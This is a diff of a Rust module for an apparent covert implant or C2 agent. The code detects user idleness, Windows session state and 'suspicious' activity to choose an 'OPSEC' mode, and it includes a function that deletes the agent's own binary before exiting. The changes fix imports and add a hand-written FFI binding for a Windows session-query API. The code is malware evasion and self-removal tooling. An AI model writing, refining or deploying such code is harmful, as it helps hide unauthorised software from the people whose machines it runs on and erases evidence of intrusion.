@@ -1,9 +1,9 @@
-use log::{debug};
-use once_cell::sync::Lazy;
+use log::{warn, debug};
 use std::sync::Mutex;
 use chrono::Timelike;
-use sysinfo::{System};
 use std::process;
+use once_cell::sync::Lazy;
+use sysinfo::System;
 
 // Opsec mode per default on High risk to ensure maximum security.
 // This module is responsible for detecting the current opsec level based on user activity and system state.
@@ -91,10 +91,10 @@ pub fn determine_agent_mode() -> AgentMode {
 #[cfg(target_os = "windows")]
 fn is_user_idle_windows() -> bool {
     use std::ptr;
-    use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO, GetForegroundWindow};
-    use winapi::um::winuser::OpenInputDesktop;
-    use winapi::um::wtsapi32::{WTSQuerySessionInformationW, WTS_CURRENT_SESSION, WTSConnectStateClass, WTSActive};
+    use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
     use winapi::shared::minwindef::{DWORD, FALSE};
+    use wts_ffi::*;
+
 
     // 1. Check idle time
     unsafe {
@@ -130,7 +130,7 @@ fn is_user_idle_windows() -> bool {
 
     // 3. Check session state
     unsafe {
-        let mut state: *mut WTSConnectStateClass = ptr::null_mut();
+        let mut state: *mut WTS_CONNECTSTATE_CLASS = ptr::null_mut();
         let mut bytes_returned: DWORD = 0;
         let result = WTSQuerySessionInformationW(
             ptr::null_mut(),
@@ -141,7 +141,7 @@ fn is_user_idle_windows() -> bool {
         );
         if result != 0 && !state.is_null() {
             debug!("[OPSEC] Session state: {:?}", *state);
-            if *state != WTSActive {
+            if *state != WTS_CONNECTSTATE_CLASS::WTSActive {
                 debug!("[OPSEC] Session is not active.");
                 return true;
             }
@@ -174,7 +174,7 @@ fn is_user_idle_windows() -> bool {
 #[cfg(target_os = "linux")]
 fn is_user_idle_linux() -> bool {
     use log::{debug, error};
-    use std::ffi::{CString, c_void};
+    use std::ffi::c_void;
     use std::ptr;
     use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};
 
@@ -282,7 +282,6 @@ pub fn self_delete_and_exit() -> ! {
         let _ = fs::remove_file(&path);
     }
     process::exit(0);
-    panic!("Agent should have exited");
 }
 
 #[derive(Default, Debug)]
@@ -334,3 +333,43 @@ fn has_suspicious_window() -> bool { false }
 
 // Placeholder: returns false, implement with platform-specific code for real use
 fn is_suspicious_network() -> bool { false }
+
+#[cfg(target_os = "windows")]
+#[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
+mod wts_ffi {
+    use std::os::raw::{c_void, c_ulong, c_int};
+
+    pub type HANDLE = *mut c_void;
+    pub type DWORD = c_ulong;
+    pub type LPWSTR = *mut u16;
+    pub type LPTSTR = *mut u16;
+    pub type BOOL = c_int;
+
+    pub const WTS_CURRENT_SESSION: DWORD = 0xFFFFFFFF;
+    pub const WTS_CONNECTSTATE_CLASS_WTSActive: u32 = 0; // 0 is WTSActive
+
+    #[repr(C)]
+    #[derive(Debug, Copy, Clone, PartialEq)] // <-- Add PartialEq here
+    pub enum WTS_CONNECTSTATE_CLASS {
+        WTSActive,
+        WTSConnected,
+        WTSConnectQuery,
+        WTSShadow,
+        WTSDisconnected,
+        WTSIdle,
+        WTSListen,
+        WTSReset,
+        WTSDown,
+        WTSInit,
+    }
+
+    extern "system" {
+        pub fn WTSQuerySessionInformationW(
+            hServer: HANDLE,
+            SessionId: DWORD,
+            WTSInfoClass: DWORD,
+            ppBuffer: *mut *mut u8,
+            pBytesReturned: *mut DWORD,
+        ) -> BOOL;
+    }
+}
